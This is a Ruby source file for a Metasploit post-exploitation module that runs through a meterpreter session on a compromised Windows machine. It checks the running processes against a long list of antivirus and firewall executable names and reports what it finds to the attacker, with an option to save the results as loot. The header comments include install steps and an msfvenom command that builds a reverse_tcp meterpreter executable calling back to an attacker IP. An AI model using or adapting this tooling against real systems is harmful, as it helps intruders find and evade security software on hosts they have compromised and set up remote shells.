##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : enum_protections.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Affected system: Windows (all)
#
#
# [ DESCRIPTION ]
# This post-module enumerates AVs present in taret process task manager (windows platforms).
# Presents process name(s), pid(s) and process absoluct path(s) to attacker and store results
# data into ~/.msf4/loot local directory (set STORE_LOOT true).
#
#
# [ MODULE OPTIONS ]
# Display enum_protections module banner?   => set BANNER false
# The session number to run this module on  => set SESSION 1
# Store session logfiles (local)            => set STORE_LOOT true 
#
#
# [ PORT MODULE TO METASPLOIT DATABASE (execute in terminal) ]
# path=$(locate modules/post/windows/recon | grep -v '\doc' | grep -v '\documentation' | head -n 1)
# sudo cp enum_protections.rb $path/enum_protections.rb
#
#
# [ RELOAD MSF DATABASE (execute in terminal) ]
# sudo service postgresql start && msfdb reinit
# sudo msfconsole -x 'db_status;reload_all;exit -y'
#
#
# [ BUILD PAYLOAD TO TEST MODULE ]
# sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 -f exe -o binary.exe
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > use post/windows/recon/enum_protections
# msf post(windows/recon/enum_protections) > info
# msf post(windows/recon/enum_protections) > show options
# msf post(windows/recon/enum_protections) > set [option(s)]
# msf post(windows/recon/enum_protections) > exploit
##



## Metasploit Module librarys to load ..
require 'rex'
require 'msf/core'
require 'msf/core/post/common'


## Metasploit Class name and mixins ..
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

         include Msf::Post::Common
         include Msf::Post::Windows::Error



        ## The 'def initialize()' funtion ..
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Windows Gather Protection Enumeration',
                        'Description'   => %q{
                                        This post-module enumerates AVs present in taret process task manager (windows platforms). Presents process name(s), pid(s) and process absoluct path(s) to attacker and store results data into ~/.msf4/loot local directory (set STORE_LOOT true).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'r00t-3xp10it <pedroubuntu10[at]gmail.com>',
                                ],
 
                        'Version'        => '$Revision: 1.0',
                        'DisclosureDate' => '25 03 2019',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',   # Thats no need for privilege escalation.
                        'Targets'        =>
                                [
                                         # Affected systems are.
                                         [ 'Windows 2008', 'Windows xp', 'windows vista', 'windows 7', 'windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '6', # Default its to run againts windows 10
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'http://rapid7.github.io/metasploit-framework/api/' ]


                                ],
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptBool.new('BANNER', [ false, 'Display enum_protections module banner?', true]),
                                OptString.new('SESSION', [ true, 'The session number to run this module on', 1]),
                                OptBool.new('STORE_LOOT', [ false, 'Store results in loot folder (logfile)?', false])
                        ], self.class)

        end



def run
  session = client
  ## Variable declarations (msf API calls)
  sysnfo = session.sys.config.sysinfo
  runtor = client.sys.config.getuid
  runsession = client.session_host
  directory = client.fs.dir.pwd

## MODULE BANNER
if datastore['BANNER'] == true
  print_line("    +--------------------------------------------+")
  print_line("    |     Enumerate AVs presence in processes    |")
  print_line("    |        Author : r00t-3xp10it (SSA)         |")
  print_line("    +--------------------------------------------+")
  print_line("")
  print_line("    Running on session  : #{datastore['SESSION']}")
  print_line("    Architecture        : #{sysnfo['Architecture']}")
  print_line("    Computer            : #{sysnfo['Computer']}")
  print_line("    Target IP addr      : #{runsession}")
  print_line("    Operative System    : #{sysnfo['OS']}")
  print_line("    Payload directory   : #{directory}")
  print_line("    Client UID          : #{runtor}")
  print_line("")
  print_line("")
end


  ## Post-Module variable declarations
  av_list = []
  data_dump=''
  print_status("Query: #{sysnfo['Computer']} task manager.")
  Rex::sleep(1.5)

     ## check for proper operative system version
     unless sysinfo['OS'] =~ /Windows/i
        print_error("[ ABORT ]: This module only works againts windows systems.")
        return nil
     end


     ## List of AVs exec names
     av_list = %W{
  a2adguard.exe
  a2adwizard.exe
  a2antidialer.exe
  a2cfg.exe
  a2cmd.exe
  a2free.exe
  a2guard.exe
  a2hijackfree.exe
  a2scan.exe
  a2service.exe
  a2start.exe
  a2sys.exe
  a2upd.exe
  aavgapi.exe
  aawservice.exe
  aawtray.exe
  ad-aware.exe
  ad-watch.exe
  alescan.exe
  anvir.exe
  ashdisp.exe
  ashmaisv.exe
  ashserv.exe
  ashwebsv.exe
  aswupdsv.exe
  atrack.exe
  avast.exe
  avgagent.exe
  avgamsvr.exe
  avgcc.exe
  avgctrl.exe
  avgemc.exe
  avgnt.exe
  avgtcpsv.exe
  avguard.exe
  avgupsvc.exe
  avgw.exe
  avkbar.exe
  avk.exe
  avkpop.exe
  avkproxy.exe
  avkservice.exe
  avktray
  avktray.exe
  avkwctl
  avkwctl.exe
  avmailc.exe
  avp.exe
  avpm.exe
  avpmwrap.exe
  avsched32.exe
  avwebgrd.exe
  avwin.exe
  avwupsrv.exe
  avz.exe
  bdagent.exe
  bdmcon.exe
  bdnagent.exe
  bdss.exe
  bdswitch.exe
  blackd.exe
  blackice.exe
  blink.exe
  boc412.exe
  boc425.exe
  bocore.exe
  bootwarn.exe
  cavrid.exe
  cavtray.exe
  ccapp.exe
  ccevtmgr.exe
  ccimscan.exe
  ccproxy.exe
  ccpwdsvc.exe
  ccpxysvc.exe
  ccsetmgr.exe
  cfgwiz.exe
  cfp.exe
  clamd.exe
  clamservice.exe
  clamtray.exe
  cmdagent.exe
  cpd.exe
  cpf.exe
  csinsmnt.exe
  dcsuserprot.exe
  defensewall.exe
  defensewall_serv.exe
  defwatch.exe
  f-agnt95.exe
  fpavupdm.exe
  f-prot95.exe
  f-prot.exe
  fprot.exe
  fsaua.exe
  fsav32.exe
  f-sched.exe
  fsdfwd.exe
  fsm32.exe
  fsma32.exe
  fssm32.exe
  f-stopw.exe
  f-stopw.exe
  fwservice.exe
  fwsrv.exe
  iamstats.exe
  iao.exe
  icload95.exe
  icmon.exe
  idsinst.exe
  idslu.exe
  inetupd.exe
  irsetup.exe
  isafe.exe
  isignup.exe
  issvc.exe
  kav.exe
  kavss.exe
  kavsvc.exe
  klswd.exe
  kpf4gui.exe
  kpf4ss.exe
  livesrv.exe
  lpfw.exe
  mcagent.exe
  mcdetect.exe
  mcmnhdlr.exe
  mcrdsvc.exe
  mcshield.exe
  mctskshd.exe
  mcvsshld.exe
  McCSPServiceHost.exe
  MsMpEng.exe
  mghtml.exe
  mpftray.exe
  msascui.exe
  mscifapp.exe
  msfwsvc.exe
  msgsys.exe
  msssrv.exe
  navapsvc.exe
  navapw32.exe
  navlogon.dll
  navstub.exe
  navw32.exe
  nisemsvr.exe
  nisum.exe
  nmain.exe
  noads.exe
  nod32krn.exe
  nod32kui.exe
  nod32ra.exe
  npfmntor.exe
  nprotect.exe
  nsmdtr.exe
  oasclnt.exe
  ofcdog.exe
  opscan.exe
  ossec-agent.exe
  outpost.exe
  paamsrv.exe
  pavfnsvr.exe
  pcclient.exe
  pccpfw.exe
  pccwin98.exe
  persfw.exe
  PEFService.exe
  protector.exe
  qconsole.exe
  qdcsfs.exe
  rtvscan.exe
  sadblock.exe
  safe.exe
  sandboxieserver.exe
  savscan.exe
  sbiectrl.exe
  sbiesvc.exe
  sbserv.exe
  scfservice.exe
  sched.exe
  schedm.exe
  scheduler daemon.exe
  sdhelp.exe
  serv95.exe
  sgbhp.exe
  sgmain.exe
  slee503.exe
  smartfix.exe
  smc.exe
  snoopfreesvc.exe
  snoopfreeui.exe
  spbbcsvc.exe
  sp_rsser.exe
  spyblocker.exe
  spybotsd.exe
  spysweeper.exe
  spysweeperui.exe
  spywareguard.dll
  spywareterminatorshield.exe
  ssu.exe
  steganos5.exe
  stinger.exe
  swdoctor.exe
  swupdate.exe
  symlcsvc.exe
  symundo.exe
  symwsc.exe
  symwscno.exe
  tcguard.exe
  tds2-98.exe
  tds-3.exe
  teatimer.exe
  tgbbob.exe
  tgbstarter.exe
  tsatudt.exe
  umxagent.exe
  umxcfg.exe
  umxfwhlp.exe
  umxlu.exe
  umxpol.exe
  umxtray.exe
  usrprmpt.exe
  vetmsg9x.exe
  vetmsg.exe
  vptray.exe
  vsaccess.exe
  vsserv.exe
  wcantispy.exe
  win-bugsfix.exe
  winpatrol.exe
  winpatrolex.exe
  wrsssdk.exe
  xcommsvr.exe
  xfr.exe
  xp-antispy.exe
  zegarynka.exe
  zlclient.exe
     }


     ## Query target process list for AVs exec names
     data_dump << "List of AVs found in: #{sysnfo['Computer']}\n\n"
     data_dump << "-------------------------------------------\n"
     session.sys.process.get_processes().each do |x|
        if (av_list.index(x['name']))
           print_good("Found - PID: #{x['pid']}   NAME: #{x['name']}   PATH: #{x['path']}")
           data_dump << "PID: #{x['pid']}   NAME: #{x['name']}   PATH: #{x['path']}\n"
        end
     end

 
     ## Store (data_dump) contents into msf loot folder? (local) ..
     if datastore['STORE_LOOT'] == true
       print_warning("Session logfile stored in: ~/.msf4/loot folder")
       store_loot("enum_protections", "text/plain", session, data_dump, "enum_protections.txt", "enum_protections")
     end


   #
   # end of the 'def run()' funtion (exploit code) ..
   #
   end

end
